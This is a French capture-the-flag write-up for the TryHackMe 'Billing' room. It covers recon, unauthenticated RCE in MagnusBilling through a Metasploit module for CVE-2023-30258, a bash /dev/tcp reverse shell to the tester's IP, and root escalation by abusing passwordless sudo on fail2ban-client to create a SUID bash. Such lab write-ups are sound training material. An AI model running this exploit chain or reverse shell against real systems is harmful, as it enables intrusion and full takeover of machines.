# TryHackMe: Billing

**Objectif :** récupérer les deux flags (user et root) sur la machine **Billing** via une exécution de commande à distance non authentifiée dans MagnusBilling, puis une escalade de privilèges grâce à une mauvaise configuration `sudo`/`fail2ban-client`.

---

## 1. Reconnaissance initiale

Notre cible : 10.10.58.0 

Mon IP : 10.21.208.96

### Scan Nmap complet

```bash
nmap -v -p- -Pn 10.10.58.0
```

**Ports ouverts :**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH |
| 80/tcp | HTTP | Apache 2.4.62 |
| 3306/tcp | MySQL | MariaDB |

---

## 2. Analyse du service HTTP

Scan plus précis :

```bash
nmap -p80,3306 -sV -sC -Pn 10.10.58.0
```

> Sur le port 80 : application **MagnusBilling** détectée sous `/mbilling`.

---

## 3. Découverte de chemins avec Gobuster

```bash
gobuster dir -u http://10.10.58.0/mbilling/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 40
```

Répertoires trouvés : `/archive`, `/assets`, `/fpdf`, `/lib`, `/resources`, `/tmp`, etc.

---

## 4. Exploitation RCE avec Metasploit

Module : `exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258`

```bash
msfconsole
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
set LHOST 10.21.208.96
set RHOST <TARGET_IP>
set LPORT 4444
set TARGET 1
run
```

> Ouvre une session `cmd/unix`.

---

## 5. Passage à un shell interactif

### Listener Netcat

```bash
nc -lvnp 4242
```

### Reverse‑shell depuis la session Metasploit

```bash
bash -c 'bash -i >& /dev/tcp/10.21.208.96/4242 0>&1'
```

### Stabilisation du shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl + Z
stty raw -echo
fg
export TERM=xterm
```

---

## 6. Récupération du flag utilisateur

```bash
cat /home/*/user.txt
```

Flag user : `THM{***USERFLAG!!***}`

---

## 7. Escalade de privilèges

### Vérification des droits sudo

```bash
sudo -l
```

> `asterisk` peut exécuter **`/usr/bin/fail2ban-client` en root sans mot de passe**.

### Exploitation de fail2ban

```bash
rsync -av /etc/fail2ban/ /tmp/fail2ban/
```

Script SUID :

```bash
cat > /tmp/script <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/bash
chmod 755 /tmp/bash
chmod u+s /tmp/bash
EOF
chmod +x /tmp/script
```

Action personnalisée :

```bash
cat > /tmp/fail2ban/action.d/custom-start-command.conf <<'EOF'
[Definition]
actionstart = /tmp/script
EOF
```

Jail custom :

```bash
cat >> /tmp/fail2ban/jail.local <<'EOF'
[my-custom-jail]
enabled = true
action = custom-start-command
EOF
```

Filtre placeholder :

```bash
cat > /tmp/fail2ban/filter.d/my-custom-jail.conf <<'EOF'
[Definition]
EOF
```

Redémarrer fail2ban :

```bash
sudo fail2ban-client -c /tmp/fail2ban/ -v restart
```

---

## 8. Shell root

```bash
/tmp/bash -p
id
```

---

## 9. Récupération du flag root

```bash
cat /root/root.txt
```

Flag root : `THM{***ROOTFLAG!!***}`

---

## 10. Conclusion

Chaîne d’exploitation : RCE non authentifiée → shell basique → reverse‑shell interactif → escalade via fail2ban mal configuré → SUID root → flags récupérés. Room terminée.

---

**Auteur :** Saad Idrissi
